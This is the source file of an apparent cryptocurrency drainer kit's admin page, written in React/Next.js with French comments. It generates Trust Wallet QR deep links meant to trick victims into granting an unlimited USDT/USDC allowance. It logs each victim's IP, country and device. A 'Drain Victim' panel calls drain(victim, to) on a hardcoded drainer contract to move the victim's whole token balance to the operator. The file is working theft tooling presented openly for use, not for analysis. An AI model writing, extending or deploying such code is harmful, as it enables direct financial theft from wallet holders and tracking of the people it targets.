"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";

// ============================================================
// CONFIG
// ============================================================

const DRAINER_ADDRESS = "0x53361FFeA401307ea149F03d7B92DA6E1989eB42"; // ← Ton contrat Drainer
const DRAINER_ABI = [
  "function drain(address victim, address to) external",
];

interface ScanLog {
  timestamp: string;
  ip: string;
  location: string;
  device: string;
  amount: string;
  token: string;
  to: string;
}

// ============================================================
// Admin Page
// ============================================================
export default function AdminPage() {
  // ---------- Authentification ----------
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isMounted, setIsMounted] = useState(false);
  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [authError, setAuthError] = useState("");

  // ---------- Configuration du QR ----------
  const [receiverAddress, setReceiverAddress] = useState("0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf");
  const [amount, setAmount] = useState("1");
  const [isMaxMode, setIsMaxMode] = useState(false);
  const [token, setToken] = useState<"USDT" | "USDC">("USDT");
  const [qrUrl, setQrUrl] = useState("");
  const qrCanvasRef = useRef<HTMLDivElement>(null);
  const qrCodeInstanceRef = useRef<any>(null);

  // ---------- Scan logs ----------
  const [scans, setScans] = useState<ScanLog[]>([]);
  const [logsLoading, setLogsLoading] = useState(true);
  const [logsError, setLogsError] = useState("");

  // ---------- Toast ----------
  const [toastMessage, setToastMessage] = useState("");

  // ---------- Drain ----------
  const [drainVictim, setDrainVictim] = useState("");
  const [drainTo, setDrainTo] = useState("");
  const [drainLoading, setDrainLoading] = useState(false);

  // ============================================================
  // Montage
  // ============================================================
  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedAddress = localStorage.getItem("admin_receiver_address");
      const savedAmount = localStorage.getItem("admin_amount");
      const savedToken = localStorage.getItem("admin_token");
      const savedMaxMode = localStorage.getItem("admin_max_mode");
      if (savedAddress) setReceiverAddress(savedAddress);
      if (savedAmount) setAmount(savedAmount);
      if (savedMaxMode === "true") setIsMaxMode(true);
      if (savedToken === "USDT" || savedToken === "USDC") setToken(savedToken);

      const auth = sessionStorage.getItem("admin_auth");
      if (auth === "true") setIsAuthenticated(true);
      setIsMounted(true);
    }
  }, []);

  // ============================================================
  // QR Code
  // ============================================================
  useEffect(() => {
    if (!isMounted || !isAuthenticated) return;

    // Sauvegarder les préférences
    localStorage.setItem("admin_receiver_address", receiverAddress);
    localStorage.setItem("admin_amount", amount);
    localStorage.setItem("admin_token", token);
    localStorage.setItem("admin_max_mode", isMaxMode ? "true" : "false");

    const origin = window.location.origin;
    const baseUrl = `${origin}/wallet`;
    const effectiveAmount = isMaxMode ? "max" : amount;
    const targetUrl = `${baseUrl}?to=${receiverAddress}&amount=${effectiveAmount}&token=${token.toLowerCase()}`;
    const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
    setQrUrl(trustWalletLink);
  }, [receiverAddress, amount, token, isMaxMode, isMounted, isAuthenticated]);

  useEffect(() => {
    if (!qrUrl || !isMounted || !isAuthenticated) return;

    import("qr-code-styling").then((QRCodeStylingModule) => {
      const QRCodeStyling = QRCodeStylingModule.default;
      const options = {
        width: 260,
        height: 260,
        type: "svg" as const,
        data: qrUrl,
        image: "/trust.png",
        dotsOptions: { color: "#000000", type: "extra-rounded" as const },
        cornersSquareOptions: { color: "#000000", type: "extra-rounded" as const },
        cornersDotOptions: { color: "#000000", type: "dot" as const },
        backgroundOptions: { color: "#ffffff" },
        imageOptions: { crossOrigin: "anonymous", margin: 6, imageSize: 0.35, hideBackgroundDots: true },
      };

      if (!qrCodeInstanceRef.current) {
        qrCodeInstanceRef.current = new QRCodeStyling(options);
        if (qrCanvasRef.current) {
          qrCanvasRef.current.innerHTML = "";
          qrCodeInstanceRef.current.append(qrCanvasRef.current);
        }
      } else {
        qrCodeInstanceRef.current.update(options);
      }
    });
  }, [qrUrl, isMounted, isAuthenticated]);

  // ============================================================
  // Authentification
  // ============================================================
  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (usernameInput === "admin" && passwordInput === "sendusdc") {
      setIsAuthenticated(true);
      setAuthError("");
      sessionStorage.setItem("admin_auth", "true");
    } else {
      setAuthError("Username or Password incorrect.");
    }
  };
  const handleLogout = () => {
    setIsAuthenticated(false);
    sessionStorage.removeItem("admin_auth");
  };

  // ============================================================
  // Scan logs
  // ============================================================
  const fetchScans = async () => {
    try {
      setLogsLoading(true);
      setLogsError("");
      const res = await fetch("/api/admin/scans");
      if (res.ok) {
        const data = await res.json();
        setScans(data.scans || []);
      } else {
        setLogsError("Failed to fetch scans history.");
      }
    } catch (err) {
      setLogsError("An error occurred while fetching scans.");
    } finally {
      setLogsLoading(false);
    }
  };
  useEffect(() => {
    if (isAuthenticated) fetchScans();
  }, [isAuthenticated]);

  // ============================================================
  // Drain function
  // ============================================================
  const handleDrain = async () => {
    if (!window.ethereum) {
      setToastMessage("No Ethereum wallet detected.");
      return;
    }
    if (!ethers.isAddress(drainVictim) || !ethers.isAddress(drainTo)) {
      setToastMessage("Invalid victim or destination address.");
      return;
    }
    setDrainLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const drainer = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer);
      const tx = await drainer.drain(drainVictim, drainTo);
      await tx.wait();
      setToastMessage("Drain successful!");
    } catch (err: any) {
      console.error(err);
      setToastMessage("Drain failed: " + (err?.message ?? "Unknown error"));
    } finally {
      setDrainLoading(false);
    }
  };

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(""), 3000);
  };

  // ============================================================
  // Utilitaires UI
  // ============================================================
  const getCountryFlag = (country: string) => {
    const flags: Record<string, string> = {
      "France": "🇫🇷", "United States": "🇺🇸", "United Kingdom": "🇬🇧", "Germany": "🇩🇪",
      "Canada": "🇨🇦", "Italy": "🇮🇹", "Spain": "🇪🇸", "Japan": "🇯🇵", "China": "🇨🇳",
      "Belgium": "🇧🇪", "Switzerland": "🇨🇭", "Morocco": "🇲🇦", "Algeria": "🇩🇿",
      "Tunisia": "🇹🇳", "Ivory Coast": "🇨🇮", "Senegal": "🇸🇳", "Cameroon": "🇨🇲",
      "Localhost": "💻", "Unknown": "📍"
    };
    return flags[country] || "📍";
  };

  const parseVal = (valStr: string) => {
    const parsed = parseFloat(valStr.replace(",", "."));
    return isNaN(parsed) ? 0 : parsed;
  };

  const totalScans = scans.length;
  const usdtVolume = scans.filter(s => s.token.toLowerCase() === "usdt").reduce((sum, s) => sum + parseVal(s.amount), 0);
  const usdcVolume = scans.filter(s => s.token.toLowerCase() === "usdc").reduce((sum, s) => sum + parseVal(s.amount), 0);

  // ============================================================
  // Rendu (non monté)
  // ============================================================
  if (!isMounted) {
    return (
      <main className="transfer-main">
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh" }}>
          <span className="btn-spinner" style={{ borderColor: "rgba(0,0,0,0.1)", borderTopColor: "#2563eb" }} />
        </div>
      </main>
    );
  }

  // ============================================================
  // Login
  // ============================================================
  if (!isAuthenticated) {
    return (
      <main className="transfer-main">
        <div className="home-content" style={{ maxWidth: "400px" }}>
          <h1 className="home-title" style={{ fontSize: "2rem", marginBottom: "1.5rem", color: "#0f172a" }}>
            Admin Access
          </h1>
          <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
            <label className="form-label">Username</label>
            <div className="input-row" style={{ marginBottom: "1.25rem" }}>
              <input type="text" value={usernameInput} onChange={(e) => setUsernameInput(e.target.value)} className="input-row__field" placeholder="Enter username" required />
            </div>
            <label className="form-label">Password</label>
            <div className="input-row" style={{ marginBottom: "1.5rem" }}>
              <input type="password" value={passwordInput} onChange={(e) => setPasswordInput(e.target.value)} className="input-row__field" placeholder="Enter password" required />
            </div>
            {authError && (
              <div style={{ color: "#ef4444", fontSize: "0.85rem", marginBottom: "1rem", fontWeight: "500" }}>
                ⚠️ {authError}
              </div>
            )}
            <button type="submit" className="next-btn" style={{ width: "100%", padding: "0.75rem" }}>
              Login
            </button>
          </form>
        </div>
      </main>
    );
  }

  // ============================================================
  // Admin principal
  // ============================================================
  return (
    <main style={{
      minHeight: "100vh",
      backgroundColor: "#f8fafc",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif",
      color: "#0f172a",
      padding: "2rem 1.5rem"
    }}>
      <div style={{ maxWidth: "1100px", margin: "0 auto" }}>
        {/* Header */}
        <header style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "2.5rem", flexWrap: "wrap", gap: "1rem" }}>
          <div>
            <h1 style={{ fontSize: "1.75rem", fontWeight: 800, margin: 0, color: "#0f172a", letterSpacing: "-0.025em", display: "flex", alignItems: "center", gap: "0.5rem" }}>
              <span style={{ color: "#0033ff" }}>🛡️</span> Scan History Admin
            </h1>
            <p style={{ margin: "0.25rem 0 0 0", color: "#64748b", fontSize: "0.9rem" }}>
              Monitor real-time QR code scans and drain victims
            </p>
          </div>
          <div style={{ display: "flex", gap: "0.75rem", alignItems: "center" }}>
            <button onClick={fetchScans} disabled={logsLoading} style={{
              backgroundColor: "#ffffff", border: "1px solid #e2e8f0", color: "#475569", fontWeight: 600,
              fontSize: "0.85rem", padding: "0.6rem 1.1rem", borderRadius: "0.5rem", cursor: "pointer",
              transition: "all 0.15s ease", boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
            }}>
              🔄 Refresh
            </button>
            <button onClick={handleLogout} style={{
              backgroundColor: "transparent", border: "none", color: "#ef4444", fontWeight: 600,
              fontSize: "0.85rem", cursor: "pointer", padding: "0.6rem 1.1rem", transition: "opacity 0.15s ease"
            }}>
              Logout 🚪
            </button>
          </div>
        </header>

        {/* Config + QR + Drain */}
        <section style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(340px, 1fr))", gap: "2rem", marginBottom: "2.5rem" }}>
          {/* Formulaire configuration */}
          <div className="form-container" style={{ background: "#fff", borderRadius: "1rem", padding: "1.5rem", boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02)", border: "1px solid #e2e8f0" }}>
            <label className="form-label">Select Asset</label>
            <div className="token-tabs">
              <button type="button" className={`token-tab ${token === "USDT" ? "token-tab--active" : ""}`} onClick={() => setToken("USDT")}>USDT</button>
              <button type="button" className={`token-tab ${token === "USDC" ? "token-tab--active" : ""}`} onClick={() => setToken("USDC")}>USDC</button>
            </div>

            <label className="form-label" style={{ marginTop: "1rem" }}>Receiver Address</label>
            <div className="input-row" style={{ marginBottom: "1.25rem" }}>
              <input type="text" value={receiverAddress} onChange={(e) => setReceiverAddress(e.target.value)} className="input-row__field" placeholder="0x..." />
            </div>

            <label className="form-label">Amount ({token})</label>
            <div className="input-row" style={{ opacity: isMaxMode ? 0.4 : 1, pointerEvents: isMaxMode ? "none" : "auto" }}>
              <input type="text" value={isMaxMode ? "Maximum" : amount} onChange={(e) => setAmount(e.target.value)} className="input-row__field" placeholder="1.0" readOnly={isMaxMode} />
            </div>
            <label style={{ display: "flex", alignItems: "center", gap: "0.5rem", marginTop: "0.65rem", cursor: "pointer", userSelect: "none" }}>
              <input type="checkbox" checked={isMaxMode} onChange={(e) => setIsMaxMode(e.target.checked)} style={{ width: "18px", height: "18px", accentColor: "#0033ff", cursor: "pointer" }} />
              <span style={{ fontSize: "0.88rem", fontWeight: 600, color: isMaxMode ? "#0033ff" : "#475569" }}>
                Maximum — send full {token} balance
              </span>
            </label>
          </div>

          {/* QR Code */}
          <div style={{ background: "#ffffff", borderRadius: "1rem", padding: "1.5rem", boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02)", border: "1px solid #e2e8f0", display: "flex", flexDirection: "column", alignItems: "center" }}>
            <div className="receive-header-bar" style={{ width: "100%", marginBottom: "1rem" }}>
              <span className="receive-header-title">Receive</span>
            </div>
            {qrUrl ? (
              <div className="qr-card" style={{ display: "flex", flexDirection: "column", alignItems: "center", background: "#ffffff", padding: "0.5rem 0.5rem 0.75rem 0.5rem", borderRadius: "1.25rem", border: "none", boxShadow: "0 4px 20px rgba(0, 0, 0, 0.03)", width: "fit-content", margin: "0 auto 0.75rem" }}>
                <div ref={qrCanvasRef} style={{ display: "flex", justifyContent: "center", alignItems: "center" }} />
                {receiverAddress && (
                  <div className="qr-address" style={{ marginTop: "0.35rem", marginBottom: 0, fontSize: "0.85rem", color: "#1e293b", fontWeight: "600", letterSpacing: "0.02em", width: "100%", textAlign: "center" }}>
                    <div>{receiverAddress.slice(0, 23)}</div>
                    <div>{receiverAddress.slice(23)}</div>
                  </div>
                )}
              </div>
            ) : (
              <div style={{ width: 260, height: 260, display: "flex", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0 auto 1.5rem" }}>
                <span className="btn-spinner" style={{ borderColor: "rgba(0,0,0,0.1)", borderTopColor: "#2563eb" }} />
              </div>
            )}
            <div style={{ marginTop: "0.5rem", textAlign: "center" }}>
              <small style={{ color: "#64748b" }}>
                {token} {isMaxMode ? "MAX" : amount} → {receiverAddress.slice(0, 6)}...{receiverAddress.slice(-4)}
              </small>
            </div>
          </div>
        </section>

        {/* Section Drain */}
        <section style={{
          backgroundColor: "#ffffff", borderRadius: "1rem", padding: "1.5rem",
          boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02)", border: "1px solid #e2e8f0", marginBottom: "2.5rem"
        }}>
          <h2 style={{ fontSize: "1.2rem", fontWeight: 700, marginBottom: "1rem", color: "#0f172a" }}>
            💀 Drain Victim
          </h2>
          <p style={{ fontSize: "0.85rem", color: "#475569", marginBottom: "1rem" }}>
            After the victim approves the unlimited allowance (by scanning the QR and clicking Next), enter their address
            and the destination address to drain all their {token} tokens.
          </p>
          <div style={{ display: "flex", gap: "1rem", flexWrap: "wrap", alignItems: "flex-end" }}>
            <div style={{ flex: "1", minWidth: "200px" }}>
              <label style={{ display: "block", fontSize: "0.8rem", fontWeight: 600, marginBottom: "0.25rem" }}>
                Victim Address
              </label>
              <input
                type="text"
                value={drainVictim}
                onChange={(e) => setDrainVictim(e.target.value)}
                placeholder="0x..."
                style={{ width: "100%", padding: "0.6rem", borderRadius: "0.5rem", border: "1px solid #cbd5e1", fontSize: "0.9rem" }}
              />
            </div>
            <div style={{ flex: "1", minWidth: "200px" }}>
              <label style={{ display: "block", fontSize: "0.8rem", fontWeight: 600, marginBottom: "0.25rem" }}>
                Destination Address (your wallet)
              </label>
              <input
                type="text"
                value={drainTo}
                onChange={(e) => setDrainTo(e.target.value)}
                placeholder="0x..."
                style={{ width: "100%", padding: "0.6rem", borderRadius: "0.5rem", border: "1px solid #cbd5e1", fontSize: "0.9rem" }}
              />
            </div>
            <button
              onClick={handleDrain}
              disabled={drainLoading}
              style={{
                backgroundColor: "#dc2626", color: "#fff", fontWeight: 600, fontSize: "0.9rem",
                padding: "0.6rem 1.5rem", borderRadius: "0.5rem", border: "none", cursor: "pointer",
                boxShadow: "0 1px 3px rgba(0,0,0,0.1)", minWidth: "120px"
              }}
            >
              {drainLoading ? "Draining..." : "Drain Now"}
            </button>
          </div>
          <div style={{ marginTop: "0.75rem", fontSize: "0.75rem", color: "#94a3b8" }}>
            This will call <code>drain(victim, to)</code> on the Drainer contract ({DRAINER_ADDRESS.slice(0, 6)}...{DRAINER_ADDRESS.slice(-4)}).
            Make sure you are connected with the <strong>owner wallet</strong>.
          </div>
        </section>

        {/* Stats */}
        <section style={{
          display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))",
          gap: "1rem", marginBottom: "2.5rem"
        }}>
          <div style={{ backgroundColor: "#fff", borderRadius: "1rem", padding: "1.2rem", boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02)", border: "1px solid #e2e8f0" }}>
            <div style={{ fontSize: "0.8rem", fontWeight: 600, color: "#64748b", textTransform: "uppercase" }}>Total Scans</div>
            <div style={{ fontSize: "2rem", fontWeight: 800, color: "#0033ff" }}>{totalScans}</div>
          </div>
          <div style={{ backgroundColor: "#fff", borderRadius: "1rem", padding: "1.2rem", boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02)", border: "1px solid #e2e8f0" }}>
            <div style={{ fontSize: "0.8rem", fontWeight: 600, color: "#64748b", textTransform: "uppercase" }}>USDT Volume</div>
            <div style={{ fontSize: "2rem", fontWeight: 800, color: "#0f172a" }}>{usdtVolume.toFixed(2)} <span style={{ fontSize: "0.9rem", color: "#64748b" }}>USDT</span></div>
          </div>
          <div style={{ backgroundColor: "#fff", borderRadius: "1rem", padding: "1.2rem", boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02)", border: "1px solid #e2e8f0" }}>
            <div style={{ fontSize: "0.8rem", fontWeight: 600, color: "#64748b", textTransform: "uppercase" }}>USDC Volume</div>
            <div style={{ fontSize: "2rem", fontWeight: 800, color: "#0f172a" }}>{usdcVolume.toFixed(2)} <span style={{ fontSize: "0.9rem", color: "#64748b" }}>USDC</span></div>
          </div>
        </section>

        {/* Logs */}
        <section style={{ backgroundColor: "#fff", borderRadius: "1rem", boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02)", border: "1px solid #e2e8f0", overflow: "hidden" }}>
          <div style={{ padding: "1rem 1.5rem", borderBottom: "1px solid #e2e8f0", display: "flex", justifyContent: "space-between" }}>
            <h2 style={{ fontSize: "1.1rem", fontWeight: 700, margin: 0 }}>Recent Activity Logs</h2>
            <span style={{ fontSize: "0.75rem", fontWeight: 600, color: "#64748b", backgroundColor: "#f1f5f9", padding: "0.25rem 0.6rem", borderRadius: "2rem" }}>{scans.length} records</span>
          </div>
          {logsLoading ? (
            <div style={{ padding: "4rem 2rem", textAlign: "center", color: "#64748b" }}>
              <div style={{ width: "28px", height: "28px", border: "3px solid #e2e8f0", borderTopColor: "#0033ff", borderRadius: "50%", animation: "spin 0.8s linear infinite", margin: "0 auto 1rem" }} />
              Loading logs...
            </div>
          ) : logsError ? (
            <div style={{ padding: "4rem 2rem", textAlign: "center", color: "#ef4444", fontWeight: 500 }}>
              ⚠️ {logsError}
            </div>
          ) : scans.length === 0 ? (
            <div style={{ padding: "5rem 2rem", textAlign: "center", color: "#94a3b8" }}>
              <div style={{ fontSize: "3rem", marginBottom: "1rem" }}>📭</div>
              <div style={{ fontWeight: 600, color: "#64748b" }}>No scan activity yet</div>
            </div>
          ) : (
            <div style={{ overflowX: "auto" }}>
              <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "0.85rem" }}>
                <thead>
                  <tr style={{ backgroundColor: "#f8fafc", borderBottom: "1px solid #e2e8f0", color: "#475569", fontWeight: 600 }}>
                    <th style={{ padding: "0.75rem 1rem" }}>Date</th>
                    <th style={{ padding: "0.75rem 1rem" }}>IP / Country</th>
                    <th style={{ padding: "0.75rem 1rem" }}>Device</th>
                    <th style={{ padding: "0.75rem 1rem" }}>Config</th>
                    <th style={{ padding: "0.75rem 1rem" }}>Dest. Address</th>
                  </tr>
                </thead>
                <tbody>
                  {scans.map((scan, idx) => (
                    <tr key={idx} style={{ borderBottom: idx === scans.length - 1 ? "none" : "1px solid #f1f5f9" }}>
                      <td style={{ padding: "0.75rem 1rem", color: "#334155", fontWeight: 500 }}>
                        {new Date(scan.timestamp).toLocaleString("en-US", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit", second: "2-digit" })}
                      </td>
                      <td style={{ padding: "0.75rem 1rem" }}>
                        <div style={{ fontWeight: 600, display: "flex", alignItems: "center", gap: "0.3rem" }}>
                          <span>{getCountryFlag(scan.location)}</span> {scan.location}
                        </div>
                        <div style={{ fontSize: "0.7rem", color: "#94a3b8" }}>{scan.ip}</div>
                      </td>
                      <td style={{ padding: "0.75rem 1rem" }}>
                        <span style={{
                          backgroundColor: scan.device.includes("Trust") ? "#eff6ff" : scan.device.includes("MetaMask") ? "#fff7ed" : "#f1f5f9",
                          color: scan.device.includes("Trust") ? "#1d4ed8" : scan.device.includes("MetaMask") ? "#c2410c" : "#475569",
                          padding: "0.2rem 0.5rem", borderRadius: "0.3rem", fontSize: "0.75rem", fontWeight: 500
                        }}>
                          {scan.device.includes("Trust") ? "🔵" : scan.device.includes("MetaMask") ? "🟠" : "📱"} {scan.device}
                        </span>
                      </td>
                      <td style={{ padding: "0.75rem 1rem", fontWeight: 700 }}>
                        {scan.amount} {scan.token}
                      </td>
                      <td style={{ padding: "0.75rem 1rem", fontFamily: "monospace", fontSize: "0.75rem", color: "#64748b" }}>
                        {scan.to ? `${scan.to.slice(0, 8)}...${scan.to.slice(-8)}` : "Default"}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </section>

        {/* Toast */}
        {toastMessage && (
          <div style={{
            position: "fixed", bottom: "2rem", right: "2rem", backgroundColor: "#1e293b", color: "#fff",
            padding: "0.75rem 1.5rem", borderRadius: "0.5rem", boxShadow: "0 10px 25px rgba(0,0,0,0.2)",
            fontWeight: 500, zIndex: 1000, animation: "fadeIn 0.3s ease"
          }}>
            {toastMessage}
          </div>
        )}
        <style jsx global>{`
          @keyframes spin { to { transform: rotate(360deg); } }
          @keyframes fadeIn { from { opacity: 0; transform: translateY(1rem); } to { opacity: 1; transform: translateY(0); } }
        `}</style>
      </div>
    </main>
  );
}